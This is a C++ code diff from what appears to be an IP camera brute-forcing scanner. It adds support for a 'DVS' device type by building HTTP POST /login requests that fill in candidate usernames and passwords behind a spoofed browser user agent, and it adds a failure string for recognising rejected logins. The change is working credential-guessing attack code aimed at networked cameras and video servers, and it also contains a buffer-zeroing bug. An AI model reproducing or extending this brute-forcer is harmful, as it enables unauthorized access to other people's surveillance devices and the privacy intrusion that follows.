@@ -1579,7 +1579,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *request, conSTR *C
 			++offlines;
 			if(iError == 10055) 
 			{
-				stt->doEmitionRedFoundData("[SOCKERR 10055] " + QString("Connection pool depleted ") + QString(ip) + ":" + QString::number(port));
+				stt->doEmitionRedFoundData("[SOCKERR 10055] Connection pool depleted " + QString(ip) + ":" + QString::number(port));
 			}
 			else if(iError == 10049)
 			{
@@ -2200,6 +2200,10 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 	{
 		negVector.push_back("403 Forbidden");
 	}
+	else if(strcmp(SPEC, "DVS") == 0)
+	{
+		negVector.push_back("Non-Existed");
+	}
 	else
 	{
 		stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
@@ -2329,6 +2333,33 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(passString, login);
 				strcat(passString, "&password=");
 				strcat(passString, pass);
+				strcat(request, "\r\nContent-Length: ");
+				char tempBuff[16] = {0};
+				strcat(request, itoa(sz, tempBuff, 10));
+				strcat(request, "\r\n\r\n");
+				strcat(request, passString);
+				delete []passString;
+			}
+			else if(strcmp(SPEC, "DVS") == 0)
+			{
+				strcpy(request, "POST /login HTTP/1.1\r\nHost: ");
+				strcat(request, ip);
+				if(port != 80){
+					strcat(request, ":");
+					char tbuff[16] = {0};
+					strcat(request, itoa(port, tbuff, 10));
+				};
+				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
+				int loginLength = strlen(login);
+				int passLength = strlen(pass);
+				int sz = loginLength + passLength + strlen("langs=en&user=&password=&submit=+Login+");
+				char *passString = new char[sz + 1];
+				ZeroMemory(passString, sizeof(passString));
+				strcpy(passString, "langs=en&user=");
+				strcat(passString, login);
+				strcat(passString, "&password=");
+				strcat(passString, pass);
+				strcat(passString, "&submit=+Login+");
 				strcat(request, "\r\nContent-Length: ");
 				char tempBuff[16] = {0};
 				strcat(request, itoa(sz, tempBuff, 10));
